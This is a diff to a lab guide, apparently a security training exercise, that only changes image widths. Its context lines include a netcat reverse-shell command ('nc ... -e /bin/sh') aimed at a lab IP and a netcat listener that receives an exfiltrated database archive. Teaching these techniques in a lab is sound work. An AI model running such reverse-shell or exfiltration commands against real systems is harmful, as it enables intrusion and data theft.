@@ -32,7 +32,7 @@ A reverse shell is a shell session established on a connection that is initiated
        | nc 10.1.50.8 4444 -e /bin/sh &
 
      .. image:: ../images/Attacks/Picture14.png
-          :width: 700
+          :width: 850
 #. Execute shell commands from Kali
      In the Kali Web Shell **Press Enter 1x prior to running commands**
   
@@ -56,7 +56,7 @@ A reverse shell is a shell session established on a connection that is initiated
        nc -l -p 8888 > Sample-DB.zip
 
      .. image:: ../images/Attacks/Picture17.png
-          :width: 800
+          :width: 850
 #. Run Data Exfiltration command from Kali (1st Web Shell [Reverse Shell Window])
 
      .. code-block::
